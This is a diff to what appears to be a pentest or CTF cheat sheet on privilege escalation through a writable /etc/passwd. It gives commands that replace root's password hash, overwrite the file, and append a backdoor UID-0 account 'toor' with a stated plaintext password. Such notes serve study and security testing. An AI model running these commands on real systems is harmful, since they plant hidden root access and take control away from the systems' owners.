@@ -377,7 +377,6 @@ File /etc/passwd can be modify by user permission.
 
 ``` bash
 ls -l /etc/passwd
--rw-rw-rw- 1 root root <snip> /etc/passwd
 ```
 
 ``` bash
@@ -391,7 +390,13 @@ QzKsrWCYxmRPY
 
 ``` bash
 sed 's/root:x:/root:QzKsrWCYxmRPY:/' /etc/passwd > passwd
+```
+
+``` bash
 cat passwd > /etc/passwd
+```
+
+``` bash
 su
 ```
 
@@ -401,8 +406,10 @@ Generate password for new user
 openssl passwd -1 -salt hades leecybersec
 ```
 
+Credential: `toor` / `leecybersec`
+
 ``` bash
-echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd
+echo 'toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/sh' >> /etc/passwd
 ```
 
 [https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)
